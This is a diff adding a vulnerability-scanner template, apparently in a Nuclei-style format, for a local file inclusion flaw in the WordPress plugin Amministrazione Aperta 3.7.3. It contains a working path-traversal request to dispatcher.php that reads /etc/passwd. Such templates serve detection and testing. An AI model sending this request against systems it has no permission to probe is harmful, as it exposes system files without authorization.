@@ -1,0 +1,22 @@
+id: amministrazione-aperta-lfi
+brief:
+    title: WordPress Amministrazione Aperta 3.7.3 - Local File Inclusion
+    by: daffainfo
+    level: high
+    about: WordPress Amministrazione Aperta 3.7.3 is vulnerable to local file inclusion.
+    label:
+        - wp-plugin
+        - lfi
+        - wp
+        - edb
+        - wordpress
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
